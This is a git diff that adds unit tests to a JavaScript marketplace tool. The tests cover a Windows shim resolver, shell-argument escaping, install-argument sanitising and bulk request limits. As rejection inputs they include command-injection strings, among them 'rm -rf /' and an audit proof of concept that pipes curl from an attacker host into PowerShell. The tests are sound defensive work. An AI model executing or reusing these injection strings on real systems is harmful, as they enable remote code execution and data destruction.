@@ -15,11 +15,11 @@ import {
 } from "../lib/sanitizers.js";
 import { readJson, safeWriteJson, getDataDir } from "../lib/state.js";
 import { reconcile } from "../lib/reconciler.js";
-import { verbFor, resolveCline, runCline } from "../lib/runner.js";
+import { verbFor, resolveCline, runCline, resolveShimScript, escapeWindowsShellArg } from "../lib/runner.js";
 import { isPortOpen, findAvailablePort } from "../bin/cline-marketplace.js";
 import { parseYamlFrontmatter, extractLocalSkillMeta, clineRootCandidates, fsProbe, listDirSafe } from "../lib/probes.js";
 import { logger, colors } from "../lib/logger.js";
-import { createApiRouter } from "../lib/routes.js";
+import { createApiRouter, sanitizeInstallArgs, MAX_BULK_ITEMS } from "../lib/routes.js";
 
 // Isolated temporary directory for persistence during unit tests
 const testTmpDir = mkdtempSync(join(tmpdir(), "clinemarket-unit-"));
@@ -174,6 +174,103 @@ test("runner: runCline executes version probe when available", async () => {
     assert.ok(typeof result.stdout === "string", "Stdout must be string");
     assert.ok(typeof result.durationMs === "number", "Duration must be number");
   }
+});
+
+test("runner: resolveShimScript extracts JS entry from .cmd wrapper unconditionally", () => {
+  const shimDir = join(testTmpDir, "shim-fixture");
+  mkdirSync(shimDir, { recursive: true });
+
+  const fakeJs = join(shimDir, "fake-cline.js");
+  writeFileSync(fakeJs, "// fake cline entry\nprocess.exit(0);\n");
+
+  const shimPath = join(shimDir, "fake-cline.cmd");
+  writeFileSync(
+    shimPath,
+    [
+      "@ECHO off",
+      "GOTO start",
+      ":find_dp0",
+      "SET dp0=%~dp0",
+      "EXIT /b %errorlevel%",
+      ":start",
+      "SETLOCAL",
+      "CALL :find_dp0",
+      'IF EXIST "%dp0%\\node.exe" (SET "_prog=%dp0%\\node.exe") ELSE (SET "_prog=node")',
+      '"%_prog%"  "%dp0%\\fake-cline.js" %*',
+    ].join("\r\n")
+  );
+
+  const resolved = resolveShimScript(shimPath);
+  assert.ok(resolved, "Shim JS entry must be resolved from wrapper");
+  assert.ok(existsSync(resolved), "Resolved JS entry must exist on disk");
+  assert.ok(resolved.endsWith("fake-cline.js"), `Resolved entry must be fake-cline.js, got: ${resolved}`);
+
+  // Shim sin entrada JS resoluble → null (habilita fallback con escape en runCline)
+  const dummyShim = join(shimDir, "no-js.cmd");
+  writeFileSync(dummyShim, "@ECHO off\r\nECHO hello\r\n");
+  assert.strictEqual(resolveShimScript(dummyShim), null, "Wrapper without JS entry must return null");
+
+  // Defensas de entrada
+  assert.strictEqual(resolveShimScript(null), null);
+  assert.strictEqual(resolveShimScript(undefined), null);
+  assert.strictEqual(resolveShimScript(join(shimDir, "missing-shim.cmd")), null);
+  assert.strictEqual(resolveShimScript(fakeJs), null, "Non-.cmd/.bat files must be rejected");
+});
+
+test("runner: escapeWindowsShellArg keeps metachars inside quoted literal (fallback C4-02)", () => {
+  // Internal quotes are doubled per cmd.exe convention
+  assert.strictEqual(escapeWindowsShellArg('say "hi"'), '"say ""hi"""');
+  // Every argument is wrapped in double quotes: cmd.exe treats & | ; < > ` $ ( )
+  // as literals inside quotes, neutralizing the injection.
+  const hostile = ["a & calc.exe", "| powershell -", "; rm -rf /", "`whoami`", "$(evil)", "x<y>z", '"quoted"', "a'b", "&&", "||"];
+  for (const arg of hostile) {
+    const escaped = escapeWindowsShellArg(arg);
+    assert.ok(escaped.startsWith('"') && escaped.endsWith('"'), `Hostile arg must be quoted: ${arg}`);
+    assert.ok(!escaped.slice(1, -1).includes('"') || arg.includes('"'), `Internal quotes must only come from doubling: ${arg}`);
+    assert.ok(escaped.length >= arg.length + 2, `Escaped arg must be wrapped: ${arg}`);
+  }
+  assert.strictEqual(escapeWindowsShellArg(""), '""');
+});
+
+test("routes: sanitizeInstallArgs rejects malicious catalog install.args (C4-01)", () => {
+  // Literal PoC from audit 04 (C4-01) + injection variants
+  const malicious = [
+    ["x", "&", "curl", "http://attacker/sh.ps1", "|", "powershell", "-"],
+    ["$(whoami)"],
+    ["${IFS}"],
+    ["`calc.exe`"],
+    ["a; rm -rf /"],
+    ["<nul"],
+    [">file"],
+    ['"quoted"'],
+    ["it's"],
+    ["..\\evil"],
+    ["../evil"],
+    [".."],
+    ["--flag;evil"],
+    ["--flag=va lue"],        // space: invalid token
+    ["a|b"],
+    ["100%"],                 // cmd variable expansion
+    ["a^b"],
+    [123],                    // elemento no-string
+    [null],
+    [{}],
+    [""],
+    ["   "],
+    ["x".repeat(129)],        // exceeds the length cap
+    [],                       // empty → provides no id, force fallback
+    "not-an-array",
+    null,
+    undefined,
+  ];
+  for (const args of malicious) {
+    assert.strictEqual(sanitizeInstallArgs(args), null, `Must reject: ${JSON.stringify(args)}`);
+  }
+
+  // Legitimate cases pass through intact and in order
+  assert.deepEqual(sanitizeInstallArgs(["--yes"]), ["--yes"]);
+  assert.deepEqual(sanitizeInstallArgs(["--config=lint.json", "--scope=global"]), ["--config=lint.json", "--scope=global"]);
+  assert.deepEqual(sanitizeInstallArgs(["@scope/pkg@1.2.3"]), ["@scope/pkg@1.2.3"]);
 });
 
 // -----------------------------------------------------------------------------
@@ -669,6 +766,8 @@ test("routes: createApiRouter handles all endpoints with in-process HTTP server"
       }),
     })).json();
     assert.strictEqual(bulkWatch.ok, true);
+    assert.strictEqual(bulkWatch.failedCount, 0, "Bulk watch must report failedCount in response");
+    assert.strictEqual(Array.isArray(bulkWatch.results), true);
 
     const bulkUnwatch = await (await fetch(`${baseUrl}/bulk`, {
       method: "POST",
@@ -686,6 +785,30 @@ test("routes: createApiRouter handles all endpoints with in-process HTTP server"
       body: JSON.stringify({ action: "unsupported" }),
     });
     assert.strictEqual(bulkBad.status, 400);
+
+    // F3: hard bulk item limit → 413
+    const bulkTooBig = await fetch(`${baseUrl}/bulk`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        action: "watch",
+        items: Array.from({ length: MAX_BULK_ITEMS + 1 }, (_, i) => ({ type: "plugin", id: `over-limit-${i}` })),
+      }),
+    });
+    assert.strictEqual(bulkTooBig.status, 413, `Bulk with ${MAX_BULK_ITEMS + 1} items must return 413`);
+
+    // At the exact limit it is accepted (watch is cheap and does not touch the runner)
+    const bulkAtLimit = await fetch(`${baseUrl}/bulk`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        action: "unwatch",
+        items: Array.from({ length: MAX_BULK_ITEMS }, (_, i) => ({ type: "plugin", id: `over-limit-${i}` })),
+      }),
+    });
+    assert.strictEqual(bulkAtLimit.status, 200);
+    const bulkAtLimitBody = await bulkAtLimit.json();
+    assert.strictEqual(bulkAtLimitBody.failedCount, 0);
 
     // 10. Import operations
     const impBad = await fetch(`${baseUrl}/import`, {
